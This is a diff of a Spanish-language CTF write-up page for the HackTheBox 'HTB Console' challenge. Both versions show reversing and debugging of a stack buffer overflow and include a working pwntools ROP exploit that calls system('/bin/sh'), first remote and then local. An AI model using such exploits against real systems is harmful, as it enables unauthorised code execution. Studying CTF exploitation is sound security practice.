@@ -8,7 +8,7 @@
 
   <title>Writeup HackTheBox HTB Console</title>
 
-  <meta name="description" content="Resolución del challenge HTB Console de la plataforma de HackTheBox">
+  <meta name="description" content="Resolución del reto HTB Console de la plataforma de HackTheBox">
   <meta name="author" content="xchg2pwn">
   <meta name="HandheldFriendly" content="True">
   <meta name="MobileOptimized" content="320">
@@ -17,18 +17,18 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Writeup HackTheBox HTB Console">
-  <meta name="twitter:description" content="Resolución del challenge HTB Console de la plataforma de HackTheBox">
+  <meta name="twitter:description" content="Resolución del reto HTB Console de la plataforma de HackTheBox">
   <meta name="twitter:creator" content="xchg2pwn">  
-  <meta name="twitter:image" content="/images/hackthebox/pwn.png" />
+  <meta name="twitter:image" content="/images/hackthebox/challenges.png" />
 
   <meta property="og:site_name" content="xchg2pwn" />
   <meta property="og:type" content="article">
   <meta property="og:title" content="Writeup HackTheBox HTB Console">
-  <meta property="og:description" content="Resolución del challenge HTB Console de la plataforma de HackTheBox">
-  <meta property="og:image" content="/images/hackthebox/pwn.png" />
+  <meta property="og:description" content="Resolución del reto HTB Console de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/hackthebox/challenges.png" />
 
   <link rel="manifest" href="/images/favicons/manifest.json">
-  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/pwn.png">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/challenges.png">
 
   <meta name="msapplication-TileColor" content="#ffc40d">
   <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
@@ -130,151 +130,113 @@
     <div class="izquierda">
       <h3 class="post-title">Contenido</h3><br>
       <ul>
-        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#reversing">Reversing</a></li>
         <li><a href="#exploitation">Explotación</a></li>
       </ul>
   </div>
 
   <header class="post-header slide-top">
     <h4 class="post-title">HackTheBox</h4>
-    <picture><img src="/images/hackthebox/pwn.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <picture><img src="/images/hackthebox/challenges.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
     <h2 class="post-title">HTB Console</h2><br>
   </header>
   
-<section class="post" id="enumeration">
-<br><h3 class="post-title">Enumeración</h3><br>
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
 
-<p class="plain-text">El binario entregado de primeras no nos deja claro el <code class="language-plaintext highlighter-rouge">uso</code> que este tiene o que hace</p>
+<p class="plain-text">El binario entregado de primeras no nos deja claro el uso que este tiene o que hace</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ./hackthebox-console</span><span class="p">
+<code><span class="ve">❯ ./htb-console</span><span class="p">
 Welcome HTB Console Version 0.1 Beta.  
 >> help
 Unrecognized command.
 >></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos analizarlo con <code class="language-plaintext highlighter-rouge">ida</code> para asi poder ver el pseudocodigo de main en <code class="language-plaintext highlighter-rouge">c</code></p>
+<p class="plain-text">Podemos iniciar analizandolo con <code class="language-plaintext highlighter-rouge">ida</code>, La función <code class="language-plaintext highlighter-rouge">main</code> inicia llamando a <code class="language-plaintext highlighter-rouge">puts</code> para mostrar un mensaje de bienvenida luego con <code class="language-plaintext highlighter-rouge">printf</code> muestra un prompt para posteriormente recibir <code class="language-plaintext highlighter-rouge">16</code> bytes con <code class="language-plaintext highlighter-rouge">fgets</code> que almacena en una variable <code class="language-plaintext highlighter-rouge">command</code>, luego llama a la función <code class="language-plaintext highlighter-rouge">console</code> pasandole <code class="language-plaintext highlighter-rouge">command</code> como único argumento</p>
 <a href="/challenges/htbconsole/1.png" target="_blank"><div><p><img src="/challenges/htbconsole/1.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> es bastante sencilla, declara un buffer de <code class="language-plaintext highlighter-rouge">16</code> bytes para una string que recibe con <code class="language-plaintext highlighter-rouge">fgets</code> y al recibirla se la pasa a la funcion <code class="language-plaintext highlighter-rouge">console</code> como argumento</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">void </span><span class="p">__fastcall __noreturn </span><span class="na">main</span><span class="p">(</span><span class="na">__int64 </span><span class="am">param_1</span><span class="p">, </span><span class="no">char </span><span class="o">**</span><span class="am">param_2</span><span class="p">, </span><span class="no">char </span><span class="o">**</span><span class="am">param_3</span><span class="p">)  
-{
-  </span><span class="no">char </span><span class="p">string[</span><span class="mi">16</span><span class="p">];</span><span class="c1"> // [rsp+0h] [rbp-10h] BYREF
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">console</code> recibe el comando en una variable <code class="language-plaintext highlighter-rouge">option</code> e inicia comparandolo con <code class="language-plaintext highlighter-rouge">strcmp</code> contra la string <code class="language-plaintext highlighter-rouge">id\n</code>, si es igual sigue la linea roja de lo contrario sigue la verde que nuevamente usa <code class="language-plaintext highlighter-rouge">strcmp</code> para ahora compararlo contra <code class="language-plaintext highlighter-rouge">dir\n</code></p>
+<a href="/challenges/htbconsole/2.png" target="_blank"><div><p><img src="/challenges/htbconsole/2.png"></p></div></a>
 
-  </span><span class="p">setup(param_1, param_2, param_3);
-  </span><span class="no">puts</span><span class="p">(</span><span class="s">"Welcome HTB Console Version 0.1 Beta."</span><span class="p">);
-  </span><span class="o">while</span><span class="p"> ( </span><span class="mi">true</span><span class="p"> )
-  {
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">">> "</span><span class="p">);
-    </span><span class="no">fgets</span><span class="p">(string, </span><span class="mi">16</span><span class="p">, stdin);
-    console(string);
-    </span><span class="no">memset</span><span class="p">(string, </span><span class="mi">0</span><span class="p">, </span><span class="o">sizeof</span><span class="p">(string));
-  }
-}</span>
-</code></pre></div></div><br>
+<p class="plain-text">Si el comando es igual a <code class="language-plaintext highlighter-rouge">id\n</code> simula la salida del comando con <code class="language-plaintext highlighter-rouge">puts</code> en el bloque de la izquierda, si es igual a <code class="language-plaintext highlighter-rouge">dir\n</code> ahora muestra con <code class="language-plaintext highlighter-rouge">puts</code> la cadena <code class="language-plaintext highlighter-rouge">/home/HTB</code></p>
+<a href="/challenges/htbconsole/3.png" target="_blank"><div><p><img src="/challenges/htbconsole/3.png"></p></div></a>
 
-<p class="plain-text">La funcion <code class="language-plaintext highlighter-rouge">console</code> maneja los posibles diferentes comandos que espera recibir</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">int</span><span class="p"> __fastcall </span><span class="na">console</span><span class="p">(</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="am">string</span><span class="p">)
-{
-  </span><span class="no">char </span><span class="p">flag[</span><span class="mi">16</span><span class="p">]; </span><span class="c1">// [rsp+10h] [rbp-10h] BYREF
+<p class="plain-text">Vamos con la siguiente comparación, al enviar la cadena <code class="language-plaintext highlighter-rouge">flag\n</code> muestra un mensaje con <code class="language-plaintext highlighter-rouge">printf</code> y con <code class="language-plaintext highlighter-rouge">fgets</code> recibe <code class="language-plaintext highlighter-rouge">48</code> bytes en un buffer que inicia en <code class="language-plaintext highlighter-rouge">rbp - 16</code>, aqui encontramos un buffer overflow ya que se reciben mas datos de los soportados</p>
+<a href="/challenges/htbconsole/6.png" target="_blank"><div><p><img src="/challenges/htbconsole/6.png"></p></div></a>
+<a href="/challenges/htbconsole/7.png" target="_blank"><div><p><img src="/challenges/htbconsole/7.png"></p></div></a>
 
-  </span><span class="o">if </span><span class="p">( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(string, </span><span class="s">"id</span><span class="mi">\n</span><span class="s">"</span><span class="p">) )
-    </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"guest(1337) guest(1337) HTB(31337)"</span><span class="p">);  
-  </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(string, </span><span class="s">"dir</span><span class="mi">\n</span><span class="s">"</span><span class="p">) )
-    </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"/home/hackthebox"</span><span class="p">);
-  </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(string, </span><span class="s">"flag</span><span class="mi">\n</span><span class="s">"</span><span class="p">) )
-  {
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"Enter flag: "</span><span class="p">);
-    </span><span class="no">fgets</span><span class="p">(flag, </span><span class="mi">48</span><span class="p">, stdin);
-    </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"Whoops, wrong flag!"</span><span class="p">);
-  }
-  </span><span class="o">else </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(string, </span><span class="s">"hof</span><span class="mi">\n</span><span class="s">"</span><span class="p">) )
-  {
-    </span><span class="no">puts</span><span class="p">(</span><span class="s">"Register yourself for HTB Hall of Fame!"</span><span class="p">);
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"Enter your name: "</span><span class="p">);
-    </span><span class="no">fgets</span><span class="p">(name, </span><span class="mi">10</span><span class="p">, stdin);
-    </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"See you on HoF soon! :)"</span><span class="p">);
-  }
-  </span><span class="o">else if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(string, </span><span class="s">"ls</span><span class="mi">\n</span><span class="s">"</span><span class="p">) )
-  {
-    </span><span class="no">puts</span><span class="p">(</span><span class="s">"- Boxes"</span><span class="p">);
-    </span><span class="no">puts</span><span class="p">(</span><span class="s">"- Challenges"</span><span class="p">);
-    </span><span class="no">puts</span><span class="p">(</span><span class="s">"- Endgames"</span><span class="p">);
-    </span><span class="no">puts</span><span class="p">(</span><span class="s">"- Fortress"</span><span class="p">);
-    </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"- Battlegrounds"</span><span class="p">);
-  }
-  </span><span class="o">else if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(string, </span><span class="s">"date</span><span class="mi">\n</span><span class="s">"</span><span class="p">) )
-  {
-    </span><span class="o">return </span><span class="no">system</span><span class="p">(</span><span class="s">"date"</span><span class="p">);
-  }
-  </span><span class="o">else</span><span class="p">
-  {
-    </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"Unrecognized command."</span><span class="p">);
-  }
-}</span>
-</code></pre></div></div><br>
+<p class="plain-text">La siguiente comparación es contra la cadena <code class="language-plaintext highlighter-rouge">hof\n</code>, si es igual recibe <code class="language-plaintext highlighter-rouge">10</code> bytes con <code class="language-plaintext highlighter-rouge">fgets</code> que lo guarda en una variable global que llamamos <code class="language-plaintext highlighter-rouge">buffer</code>, esta se guarda siempre de forma estática en la misma dirección <code class="language-plaintext highlighter-rouge">0x4040b0</code> en el segmento <code class="language-plaintext highlighter-rouge">bss</code></p>
+<a href="/challenges/htbconsole/8.png" target="_blank"><div><p><img src="/challenges/htbconsole/8.png"></p></div></a>
+<a href="/challenges/htbconsole/9.png" target="_blank"><div><p><img src="/challenges/htbconsole/9.png"></p></div></a>
+<a href="/challenges/htbconsole/10.png" target="_blank"><div><p><img src="/challenges/htbconsole/10.png"></p></div></a>
 
-<p class="plain-text">Hay una vulnerabilidad en el comando <code class="language-plaintext highlighter-rouge">flag</code> y viene de usar con un buffer tan limitado de <code class="language-plaintext highlighter-rouge">16</code> bytes la funcion <code class="language-plaintext highlighter-rouge">fgets</code>, ya que puede resultar en un buffer overflow</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">char </span><span class="p">flag[</span><span class="mi">16</span><span class="p">];
-
-</span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(string, </span><span class="s">"flag</span><span class="mi">\n</span><span class="s">"</span><span class="p">) )
-{
-  </span><span class="no">printf</span><span class="p">(</span><span class="s">"Enter flag: "</span><span class="p">);
-  </span><span class="no">fgets</span><span class="p">(flag, </span><span class="mi">48</span><span class="p">, stdin);
-  </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"Whoops, wrong flag!"</span><span class="p">);  
-}</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Mirando las protecciones del binario nos encontramos con <code class="language-plaintext highlighter-rouge">NX</code> que nos impedira poder ejecutar shellcode en la pila por lo que es probable que necesitemos de <code class="language-plaintext highlighter-rouge">ROP</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ checksec </span><span class="p">htb-console
-[</span><span class="az">*</span><span class="p">] '/home/kali/hackthebox-console'
-    Arch:     amd64-64-little
-    RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
-    Stack:    </span><span class="ro">No canary found</span><span class="p">
-    NX:       </span><span class="ve">NX enabled</span><span class="p">
-    PIE:      </span><span class="ro">No PIE (0x400000)  </span>
-</code></pre></div></div><br>
+<p class="plain-text">Finalmente tenemos los comandos <code class="language-plaintext highlighter-rouge">ls\n</code> y <code class="language-plaintext highlighter-rouge">date\n</code>, el primero simula la salida con <code class="language-plaintext highlighter-rouge">puts</code> pero el segundo si que ejecuta el comando con <code class="language-plaintext highlighter-rouge">system</code> asi que está cargado</p>
+<a href="/challenges/htbconsole/4.png" target="_blank"><div><p><img src="/challenges/htbconsole/4.png"></p></div></a>
+<a href="/challenges/htbconsole/5.png" target="_blank"><div><p><img src="/challenges/htbconsole/5.png"></p></div></a>
 
 </section>
 
 <section class="post" id="exploitation">
 <br><h3 class="post-title">Explotación</h3><br>
 
-<p class="plain-text">Para iniciar abrimos le binario con <code class="language-plaintext highlighter-rouge">gdb</code> y creamos un patron de 50 caracteres especiales para buscar el <code class="language-plaintext highlighter-rouge">offset</code>, despues corremos el programa y lo enviamos</p>
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, este binario solo tiene activada la protección <code class="language-plaintext highlighter-rouge">NX</code> que nos impedirá ejecutar shellcode directamente en el stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">htb-console
+[</span><span class="az">*</span><span class="p">] '/home/user/htb-console'
+    Arch:       amd64-64-little
+    RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:      </span><span class="ro">No canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ro">No PIE (0x400000)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Abrimos el programa con <code class="language-plaintext highlighter-rouge">gdb</code>, iniciamos por comprobar el comando <code class="language-plaintext highlighter-rouge">hof</code>, enviamos como entrada <code class="language-plaintext highlighter-rouge">8 A's</code> que como sabemos se ven reflejadas en la direccion <code class="language-plaintext highlighter-rouge">0x4040b0</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ gdb </span><span class="p">-q htb-console
 Reading symbols from </span><span class="ve">htb-console</span><span class="p">...
 (No debugging symbols found in </span><span class="ve">htb-console</span><span class="p">)
-</span><span class="ro">pwndbg> </span><span class="p">cyclic 50
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
-</span><span class="ro">pwndbg> </span><span class="p">run
-Starting program: </span><span class="ve">/home/kali/hackthebox-console</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> run
+Starting program: </span><span class="ve">/home/user/htb-console</span><span class="p">
+[Depuración de hilo usando libthread_db enabled]
 Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".  
 Welcome HTB Console Version 0.1 Beta.
->> flag
-Enter flag: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
+>> hof
+Register yourself for HTB Hall of Fame!
+Enter your name: AAAAAAAA
+See you on HoF soon! :)
+>> ^C
+Program received signal SIGINT, Interrupt.
+</span><span class="ro">pwndbg></span><span class="p"> x/s 0x4040b0
+</span><span class="az">0x4040b0</span><span class="p">:    "AAAAAAAA"
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora vamos con la verdadera vulnerabilidad, enviaremos <code class="language-plaintext highlighter-rouge">16 A's</code>, <code class="language-plaintext highlighter-rouge">8 B's</code>, <code class="language-plaintext highlighter-rouge">8 C's</code> y <code class="language-plaintext highlighter-rouge">24 D's</code> que suman los <code class="language-plaintext highlighter-rouge">48</code> bytes, al enviarlos en el comando <code class="language-plaintext highlighter-rouge">flag</code> rellenamos con las <code class="language-plaintext highlighter-rouge">A's</code> los <code class="language-plaintext highlighter-rouge">16</code> bytes antes de <code class="language-plaintext highlighter-rouge">rbp</code>, rbp toma el valor de las <code class="language-plaintext highlighter-rouge">B's</code> en el <code class="language-plaintext highlighter-rouge">leave</code> y el return address apunta a las <code class="language-plaintext highlighter-rouge">C's</code>, y al final en el stack quedan almacenadas las <code class="language-plaintext highlighter-rouge">D's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">-q
+>>> b"A" * 16 + b"B" * 8 + b"C" * 8 + b"D" * 24
+b'AAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD'  
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">>> flag
+Enter flag: AAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD  
 Whoops, wrong flag!
 
 Program received signal SIGSEGV, Segmentation fault.
-</span><span class="az">0x0000000000401396 </span><span class="p">in </span><span class="am">??</span><span class="p"> ()
+</span><span class="az">0x0000000000401396 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
+</span><span class="az">$1</span><span class="p"> = 0x4242424242424242
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x7fffffffe298</span><span class="p">:    0x4343434343434343
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rsp+8
+</span><span class="az">0x7fffffffe2a0</span><span class="p">:    'D' &ltrepetidos 24 veces>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Una vez corrompe podemos buscar el offset usando <code class="language-plaintext highlighter-rouge">cyclic -l</code> que es la cantidad de bytes necesarios antes de sobreescribir la siguiente instruccion de retorno</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">x/gx $rsp
-</span><span class="az">0x7fffffffe558</span><span class="p">:	0x6161616161616164
-</span><span class="ro">pwndbg> </span><span class="p">cyclic -l 0x6161616161616164
-</span><span class="sa">Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)  
-</span><span class="ve">Found at offset 24
-</span><span class="ro">pwndbg></span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Sabemos que el NX esta habilitado por lo que tendremos que usar <code class="language-plaintext highlighter-rouge">ROP</code>, iniciamos buscando la direccion de <code class="language-plaintext highlighter-rouge">system</code> para poder usarla y asi ejecutar comandos</p>
+<p class="plain-text">Sabemos que el NX esta habilitado por lo que tendremos que usar <code class="language-plaintext highlighter-rouge">ROP</code>, iniciamos buscando la direccion de <code class="language-plaintext highlighter-rouge">system</code> para poder llamarla y asi ejecutar comandos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg> </span><span class="p">info functions system
 All functions matching regular expression "system@plt":  
@@ -284,7 +246,7 @@ Non-debugging symbols:
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestra idea sera ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code> pero para pasarsela como argumento a <code class="language-plaintext highlighter-rouge">system</code> tenemos que guardarla en el registro RDI para ello usaremos un <code class="language-plaintext highlighter-rouge">pop rdi</code></p>
+<p class="plain-text">Nuestra idea sera ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code> pero para pasarsela como argumento a <code class="language-plaintext highlighter-rouge">system</code> necesitamos guardar su referencia en <code class="language-plaintext highlighter-rouge">rdi</code> para ello usaremos un <code class="language-plaintext highlighter-rouge">pop rdi</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ropper </span><span class="p">--file htb-console --search </span><span class="am">"pop rdi; ret;"  
 </span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
@@ -296,94 +258,38 @@ Non-debugging symbols:
 </span><span class="ro">0x0000000000401473</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Sin embargo la string <code class="language-plaintext highlighter-rouge">/bin/sh</code> no existe en el binario, aunque algo interesante es el comando <code class="language-plaintext highlighter-rouge">hof</code> que recibe una string y es probable que guarde en memoria</p>
+<p class="plain-text">Resumiendo, el exploit llama a <code class="language-plaintext highlighter-rouge">hof</code> para guardar la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> en la dirección <code class="language-plaintext highlighter-rouge">0x4040b0</code>, luego llama a <code class="language-plaintext highlighter-rouge">flag</code> y rellena con <code class="language-plaintext highlighter-rouge">A's</code> el offset hasta el return address, en el llama a <code class="language-plaintext highlighter-rouge">pop rdi</code> que guarda la dirección <code class="language-plaintext highlighter-rouge">0x4040b0</code> en <code class="language-plaintext highlighter-rouge">rdi</code> y finalmente llama a <code class="language-plaintext highlighter-rouge">system</code>, como en esa dirección guardamos la string de <code class="language-plaintext highlighter-rouge">/bin/sh</code> devuelve una shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(string, </span><span class="s">"hof</span><span class="mi">\n</span><span class="s">"</span><span class="p">) )
-{
-  </span><span class="no">puts</span><span class="p">(</span><span class="s">"Register yourself for HTB Hall of Fame!"</span><span class="p">);
-  </span><span class="no">printf</span><span class="p">(</span><span class="s">"Enter your name: "</span><span class="p">);
-  </span><span class="no">fgets</span><span class="p">(name, </span><span class="mi">10</span><span class="p">, stdin);
-  </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"See you on HoF soon! :)"</span><span class="p">);</span>
-</code></pre></div></div><br>
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64
 
-<p class="plain-text">Corremos el programa y usamos el comando <code class="language-plaintext highlighter-rouge">hof</code> enviando como nombre <code class="language-plaintext highlighter-rouge">/bin/sh</code>, si despues de eso buscamos la string aparece en la direccion <code class="language-plaintext highlighter-rouge">0x4040b0</code> del binario</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">run
-Starting program: </span><span class="ve">/home/kali/hackthebox-console</span><span class="p">
-Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
-Welcome HTB Console Version 0.1 Beta.
->> hof
-Register yourself for HTB Hall of Fame!
-Enter your name: /bin/sh
-See you on HoF soon! :)
->> ^C
-Program received signal SIGINT, Interrupt.
-</span><span class="ro">pwndbg> </span><span class="p">search /bin/sh
-Searching for value: '/bin/sh'
-</span><span class="sa">htb-console     0x4040b0 </span><span class="p">'/bin/sh\n'
-</span><span class="ro">pwndbg></span>
-</code></pre></div></div><br>
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./htb-console"</span><span class="p">)
 
-<p class="plain-text">El payload para el explotarlo enviara basura hasta antes de la siguiente instruccion de retorno, guardara <code class="language-plaintext highlighter-rouge">/bin/sh</code> como argumento en rdi que ejecutara con <code class="language-plaintext highlighter-rouge">system</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">bin_sh
-payload </span><span class="o">+= </span><span class="p">system</span>
-</code></pre></div></div><br>
+offset</span><span class="o"> =</span><span class="mi"> 24</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-<p class="plain-text">El exploit usara el comando hof para guardar la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> en <code class="language-plaintext highlighter-rouge">0x4040b0</code> y despues enviara el payload para el <code class="language-plaintext highlighter-rouge">buffer overflow</code> que nos devolvera una shell</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">shell.sendlineafter</span><span class="p">(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, </span><span class="no">b</span><span class="s">"hof"</span><span class="p">)
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x401473</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x4040b0</span><span class="p">)</span><span class="c1"> # "/bin/sh"</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x401040</span><span class="p">)</span><span class="c1"> # system()</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="s"> </span><span class="no">b</span><span class="s">"hof"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"name: "</span><span class="p">, </span><span class="no">b</span><span class="s">"/bin/sh</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)
 
-shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, </span><span class="no">b</span><span class="s">"flag"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"flag: "</span><span class="p">, payload)</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">El exploit final para explotarlo quedaria de esta forma, este espera un argumento que es el host y el puerto separados por un <code class="language-plaintext highlighter-rouge">:</code> como lo otorga htb</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64, log, sys
-
-</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
-    log.failure(</span><span class="no">f</span><span class="s">"Uso: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &lthost:port>"</span><span class="p">)  
-    sys.exit(</span><span class="mi">1</span><span class="p">)
-
-host, port </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">].split(</span><span class="s">":"</span><span class="p">)
-shell </span><span class="o">= </span><span class="p">remote(host, port)
-
-offset </span><span class="o">= </span><span class="mi">24</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
-
-pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401473</span><span class="p">)
-system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
-bin_sh </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x4040b0</span><span class="p">)
-
-payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">bin_sh
-payload </span><span class="o">+= </span><span class="p">system
-
-shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"hof"</span><span class="p">)
-shell.sendlineafter(</span><span class="no">b</span><span class="s">"name: "</span><span class="p">, </span><span class="no">b</span><span class="s">"/bin/sh</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)
-
-shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, </span><span class="no">b</span><span class="s">"flag"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"flag"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"flag: "</span><span class="p">, payload)
 
-shell.recv()
+shell.recvline()
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el exploit remoto conseguimos una shell como <code class="language-plaintext highlighter-rouge">root</code> donde leemos la flag</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ python3 </span><span class="p">exploit.py 206.189.28.151:30178
-[</span><span class="ve">+</span><span class="p">] Opening connection to 206.189.28.151 on port 30178: Done  
